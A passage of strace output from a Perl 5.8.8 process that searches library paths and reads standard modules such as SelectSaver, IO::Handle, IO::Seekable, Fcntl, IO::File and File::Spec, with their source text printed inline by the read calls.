$stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
6687  07:15:03.340042 read(8, "", 4096) = 0
6687  07:15:03.340060 close(8)          = 0
6687  07:15:03.340124 stat64("/etc/perl/SelectSaver.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340141 stat64("/etc/perl/SelectSaver.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340155 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340168 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340183 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340195 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340210 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340222 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340239 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340252 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340265 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340278 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340293 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.340306 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
6687  07:15:03.340353 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.340383 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.340395 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.340414 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
6687  07:15:03.340542 brk(0x81d6000 <unfinished ...>
6685  07:15:03.340559 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6685  07:15:03.340580 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6685  07:15:03.340594 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
6685  07:15:03.340605 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
6685  07:15:03.340617 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
6685  07:15:03.340631 waitpid(-1,  <unfinished ...>
6687  07:15:03.340642 <... brk resumed> ) = 0x81d6000
6687  07:15:03.340667 read(8, "", 4096) = 0
6687  07:15:03.340679 close(8)          = 0
6687  07:15:03.341144 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
6687  07:15:03.350006 read(6, "", 4096) = 0
6687  07:15:03.350035 close(6)          = 0
6687  07:15:03.350077 stat64("/etc/perl/IO/Seekable.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.350094 stat64("/etc/perl/IO/Seekable.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350108 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.350121 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350136 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.350149 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350163 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.350175 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350188 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.350201 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350214 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.350227 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
6687  07:15:03.350249 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.350265 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.350308 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.350343 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
6687  07:15:03.350480 stat64("/etc/perl/Fcntl.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350495 stat64("/etc/perl/Fcntl.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350509 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350521 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350535 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350547 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350561 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350573 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350586 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350597 stat64("/usr/share/perl5/Fcntl.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350610 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.350623 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
6687  07:15:03.350644 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.350658 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.350669 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.350688 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
6687  07:15:03.351078 brk(0x81f7000)    = 0x81f7000
6687  07:15:03.351261 read(8, "", 4096) = 0
6687  07:15:03.351318 close(8)          = 0
6687  07:15:03.351407 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
6687  07:15:03.351432 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6687  07:15:03.351460 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
6687  07:15:03.351475 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
6687  07:15:03.351567 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
6687  07:15:03.351585 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7da0000
6687  07:15:03.351599 mmap2(0xb7da3000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7da3000
6687  07:15:03.351615 close(8)          = 0
6687  07:15:03.351868 read(6, "", 4096) = 0
6687  07:15:03.351891 close(6)          = 0
6687  07:15:03.351924 stat64("/etc/perl/IO/File.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.351940 stat64("/etc/perl/IO/File.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.351953 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.351966 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.351981 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.351997 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352011 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.352023 stat64("/usr/lib/perl5/IO/File.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352036 stat64("/usr/share/perl5/IO/File.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.352048 stat64("/usr/share/perl5/IO/File.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352061 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.352074 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
6687  07:15:03.352095 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.352109 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.352121 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.352139 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
6687  07:15:03.352425 stat64("/etc/perl/File/Spec.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352441 stat64("/etc/perl/File/Spec.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352454 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352467 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352481 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352494 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352508 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352520 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352533 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352545 stat64("/usr/share/perl5/File/Spec.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352562 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352574 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352588 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352601 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
6687  07:15:03.352622 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.352637 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.352648 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.352666 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
6687  07:15:03.352741 stat64("/etc/perl/vars.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352754 stat64("/etc/perl/vars.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.352797 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352810 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
6687  07:15:03.352838 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfdad19c) = -1 ENOENT (No such file or directory)
6687  07:15:03.352850 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfdad0ac) = -1 ENOENT (No such file or directory)
